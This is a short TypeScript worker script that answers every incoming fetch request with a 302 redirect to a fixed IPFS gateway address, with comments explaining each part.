// redirect.ts

// Define the redirect URL
const redirectUrl = "https://ipfs.io/ipfs/bafkreid2vm3c7nvmj6fpdkkexg3ltjhmxjl2vhitogrecnp7sgyyhtpn2i"; // Replace with the URL you want to redirect to

// Handle the request
addEventListener("fetch", (event) => {
  event.respondWith(
    new Response(null, {
      status: 302, // HTTP status for redirection
      headers: {
        "Location": redirectUrl, // The URL to redirect to
      },
    })
  );
});
